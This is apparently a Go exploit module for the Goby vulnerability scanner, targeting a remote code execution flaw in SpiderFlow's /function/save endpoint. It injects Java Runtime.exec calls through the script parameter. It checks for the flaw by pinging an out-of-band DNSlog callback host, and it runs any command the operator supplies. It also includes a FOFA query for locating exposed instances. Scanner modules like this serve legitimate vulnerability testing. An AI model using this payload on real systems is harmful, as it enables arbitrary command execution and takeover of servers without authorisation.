package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "SpiderFlow save Api RCE vulnerability",
    "Description": "<p>SpiderFlow is a new generation of crawler platform, which defines the crawler process in a graphical way, and can complete the crawler without writing code.</p><p>SpiderFlow has a remote code execution vulnerability. An attacker can execute arbitrary code by adding a custom function to gain server permissions.</p>",
    "Impact": "<p>SpiderFlow has a remote code execution vulnerability. An attacker can execute arbitrary code by adding a custom function to gain server permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.spiderflow.org/\">https://www.spiderflow.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "SpiderFlow",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "SpiderFlow save 接口远程代码执行漏洞",
            "Product": "SpiderFlow",
            "Description": "<p>SpiderFlow是新一代爬虫平台，以图形化方式定义爬虫流程，不写代码即可完成爬虫。</p><p>SpiderFlow存在远程代码执行漏洞，攻击者可通过添加自定义函数执行任意代码，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.spiderflow.org/\">https://www.spiderflow.org/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>SpiderFlow存在远程代码执行漏洞，攻击者可通过添加自定义函数执行任意代码，获取服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SpiderFlow save Api RCE vulnerability",
            "Product": "SpiderFlow",
            "Description": "<p>SpiderFlow is a new generation of crawler platform, which defines the crawler process in a graphical way, and can complete the crawler without writing code.</p><p>SpiderFlow has a remote code execution vulnerability. An attacker can execute arbitrary code by adding a custom function to gain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.spiderflow.org/\">https://www.spiderflow.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">SpiderFlow has a remote code execution vulnerability. An attacker can execute arbitrary code by adding a custom function to gain server permissions.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"SpiderFlow\"",
    "GobyQuery": "title=\"SpiderFlow\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/ssssssss-team/spider-flow",
    "DisclosureDate": "2021-10-21",
    "References": [
        "https://fofa.info"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10260"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			RandName := goutils.RandomHexString(6)
			uri1 := "/function/save"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = fmt.Sprintf("id=&name=%s&parameter=&script=%%7DJava.type(%%22java.lang.Runtime%%22).getRuntime().exec('ping+-c+1+%s')%%3B%%7B", RandName, checkUrl)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && godclient.PullExists(checkStr, time.Second*10)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(6)
			uri1 := "/function/save"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = fmt.Sprintf("id=&name=%s&parameter=&script=%%7DJava.type(%%22java.lang.Runtime%%22).getRuntime().exec('%s')%%3B%%7B", RandName, url.QueryEscape(cmd))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = "it is a bind RCE"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
